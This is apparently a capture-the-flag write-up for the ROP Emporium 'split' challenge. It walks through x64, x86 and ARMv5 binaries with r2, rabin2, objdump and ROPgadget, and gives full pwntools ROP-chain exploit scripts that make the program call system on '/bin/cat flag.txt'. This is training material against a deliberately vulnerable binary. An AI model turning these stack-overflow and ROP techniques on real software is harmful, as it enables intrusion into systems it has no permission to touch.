# split

## x64 (x86_64)

The program flow is similar to the previous challenge, where some input is accepted and it returns. We can analyze the binary using r2 and find there is a main function which calls a pwnme function. There is also a usefulFunction which isn't actually called.

```bash
$ r2 split
[0x004005b0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004005b0]> s sym.usefulFunction
[0x00400742]> pdf
┌ 17: sym.usefulFunction ();
│   0x00400742      55             push rbp
│   0x00400743      4889e5         mov rbp, rsp
│   0x00400746      bf4a084000     mov edi, str._bin_ls        ; 0x40084a ; "/bin/ls"
│   0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│   0x00400750      90             nop
│   0x00400751      5d             pop rbp
└   0x00400752      c3             ret
```

This calls /bin/ls which isn't useful since we want to call /bin/cat flag.txt. We can use rabin2 to find where that text is.

```bash
$ rabin2 -z split  
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

So its at address 0x00601060.

Lets test the binary input by generating a fuzzing payload and use gdb with r2.

```bash
# creates a de bruijn sequence of length 100
$ ragg2 -P 100 -r > fuzzing.txt
$ echo '#!/usr/bin/rarun2' > profile.rr2
$ echo 'stdin=./fuzzing.txt' >> profile.rr2
$ r2 -de dbg.profile=profile.rr2 split
Process with PID 6381 started...
= attach 6381 6381
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
# it uses the fuzzing payload to auto-enter it into the binary and trigger the SEGVSIG
[0x7fc7d4592090]> dc
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0
# prints hexadecimal quad word 8 byte dump at RSP
[0x00400741]> pxq 8@rsp
0x7ffc4d476d88  0x41415041414f4141                       AAOAAPAA
# finds given value into a de bruijn sequence (how much garbage do we need to get to RSP)
[0x00400741]> wopO 0x41415041414f4141
40
```

This means the RIP offset is 40 bytes (we already know this). Lets find the system@plt address so we can call system later.

```bash
$ objdump -d split | grep system@plt
0000000000400560 <system@plt>:
  40074b:	e8 10 fe ff ff       	callq  400560 <system@plt>
```

So the system@plt address is 0x400560, we know the /bin/cat flag.txt string is at address 0x00601060, and we need 40 bytes of garbage at the beginning of the payload. Our goal is to use system() to call /bin/cat flag.txt as the first argument, and $rdi is used to pass the first argument to the called function (based off this [x64 cheatsheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)). We can do this using ROPgadget.

```bash
$ ROPgadget --binary split | grep rdi
0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
0x00000000004007c3 : pop rdi ; ret
0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
```

the pop rdi; ret is the one we want. The ROP chain we have now is: garbage for $rip offset + pass address of /bin/cat flag.txt into $rdi + call system() with this argument. We can construct the pwntools script now.

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./split")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

# addresses/data
OFFSET = 40
POP_RDI = p64(0x00000000004007c3)
BIN_CAT_FLAG_ADDR = p64(0x00601060)
SYSTEM_CALL_ADDR = p64(0x400560)

rop.raw(b"A"*OFFSET)            # junk: RIP offset
rop.raw(POP_RDI)                # rop rdi: ROPgadget --binary split | grep rdi 
rop.raw(BIN_CAT_FLAG_ADDR)      # cat addr: rabin2 -z split
rop.raw(SYSTEM_CALL_ADDR)       # system@plt: objdump -d split | grep system@plt 

# chain: junk + pop rdi + cat address + system@plt
p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[1])
```

which gets us our flag.

## x86

Lets do the same for the 32 bit version. There are two ways we can find the offset.

```bash
$ r2 -de dbg.profile=profile.rr2 split32
Process with PID 3819 started...
= attach 3819 3819
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
[0xf7f470b0]> dc
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
[+] SIGNAL 11 errno=0 addr=0x41415041 code=1 si_pid=1094799425 ret=0
[0x41415041]> pxq 4@eip
0x41415041  0x00000000ffffffff                       ....
[0x41415041]> wopO 0x41415041
44
# or
[0x41415041]> wopO `dr eip`
44
```

So our $eip offset is 44 bytes. Both methods work for 32 bit here because the input seems to overflow into $eip whereas for the 64 bit binary it doesn't flow into the $rip but straight into the $rsp which seems to mess something up.

We can find the system@plt address and /bin/cat flag.txt address using the same method for the 64 bit version. The system@plt is at 0x80483e0 and the /bin/cat flag.txt string is at 0x0804a030.

Also given it is a 32 bit binary, we pass the function argument onto the stack rather than into a register which reduces our ROP chain length.

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./split32")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

# addresses/data
OFFSET = 44
PADDING = p32(0)
SYSTEM_CALL_ADDR = p32(0x80483e0)
BIN_CAT_FLAG_ADDR = p32(0x0804a030)

rop.raw(b"A"*OFFSET)                # junk: EIP offset
rop.raw(SYSTEM_CALL_ADDR)           # system@plt: objdump -d split | grep system@plt 
rop.raw(PADDING)
rop.raw(BIN_CAT_FLAG_ADDR)          # cat addr: rabin2 -z split

# chain: junk + system@plt + BBBB + cat address
p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[1])
```

Then we get out flag.

## ARMv5

Lets use r2 to check out the usefulFunction.

```bash
$ r2 split_armv5
[0x00010428]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00010428]> s sym.usefulFunction
[0x000105d4]> pdf
┌ 24: sym.usefulFunction ();
│   0x000105d4      00482de9       push {fp, lr}
│   0x000105d8      04b08de2       add fp, sp, 4
│   0x000105dc      08009fe5       ldr r0, [str._bin_ls]       ; [0x105ec:4]=0x106c8 str._bin_ls
│   0x000105e0      81ffffeb       bl sym.imp.system           ; int system(const char *string)
│   0x000105e4      0000a0e1       mov r0, r0
└   0x000105e8      0088bde8       pop {fp, pc}
```

I haven't had much luck manually finding the offset, but we know that it is 36 since the website told us. We could just repeatedly fuzz the input and check the registers but whatever. We can again find the /bin/cat flag.txt using the same method as before. Finding the system@plt is a bit different since objdump won't work without building an ARM-specific version so lets do that. get and build the toolchain from [here](http://osmocom.org/projects/baseband/wiki/toolchain).

```bash
$ arm-none-eabi-objdump -d split_armv5 | grep system@plt
000103ec <system@plt>:
   105e0:	ebffff81 	bl	103ec <system@plt>
```

So our `bl system()` address is 0x103ec and the /bin/cat flag.txt address is 0x2103c. passing the argument into the function is different than the previous methods as ARM is RISC and x86 is CISC. we must pass it into $r0. check out [this azeria labs post on ARM32 ROP](https://azeria-labs.com/return-oriented-programming-arm32/). In order to find the ROP gadgets we can use r2.

```bash
$ r2 split_armv5
[0x00010428]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00010428]> /R | grep pop
  0x00010644           f087bde8  pop {r4, r5, r6, r7, r8, sb, sl, pc}
[0x00010428]> /R | grep r0
 0x00010634           0700a0e1  mov r0, r7
[0x00010428]> /R | grep r3
  0x00010658           0880bde8  pop {r3, pc}
[0x00010428]> s 0x10634
[0x00010634]> pdf
  0x00010634      0700a0e1       mov r0, r7
  0x00010638      33ff2fe1       blx r3
```

The ROP chain will be constructed like so: 
- 36 byte garbage offset
- pop contents of pc (`bl system()` call) into $r3 with `pop {r3, pc}` to use later
- pop address for string /bin/cat flag.txt into $r7 first with `pop {r4, r5, r6, r7, r8, sb, sl, pc}` and then put the addr into $r7 with padding into the other registers.
- move contents of $r7 into $r0, so moving /bin/cat flag.txt into $r0 which will serve as our system call argument and then call branch link exchange (blx) to $r3 which will hit the system call.

This produces the flag but it hits a SIGSEGV after which is weird but I don't care enough to fix it since it works anyway. The python script is below.

```py
#!/usr/bin/env python3

from pwn import *

binary = ELF("./split_armv5")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

# addresses/data
OFFSET = 36
PADDING = p32(0)
BIN_CAT_FLAG_ADDR = p32(0x2103c)        # /bin/cat flag.txt address
SYSTEM_CALL_ADDR = p32(0x103ec)         # bl system()
POP_MANY = p32(0x10644)                 # pop {r4, r5, r6, r7, r8, sb, sl, pc}
MOV_R0_R7 = p32(0x10634)                # mov r0, r7
POP_R3_PC = p32(0x10658)                # pop {r3, pc}


# ROP chain construction
# 36 char garbage
rop.raw(b"A"*OFFSET)

# pc -> r3
rop.raw(POP_R3_PC)
# system() -> pc
# so we're putting the address of bl system to use later
rop.raw(SYSTEM_CALL_ADDR)

# place the /bin/cat flag.txt into r7 whilst putting
# nothing into everything else
rop.raw(POP_MANY)
rop.raw(PADDING)                        # r4
rop.raw(PADDING)                        # r5
rop.raw(PADDING)                        # r6
rop.raw(BIN_CAT_FLAG_ADDR)              # /bin/cat flag.txt address into r7
rop.raw(PADDING)                        # r8 
rop.raw(PADDING)                        # sb
rop.raw(PADDING)                        # sl

# r7 -> r0
# which will do system("/bin/cat flag.txt")
rop.raw(MOV_R0_R7)

p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[1])
```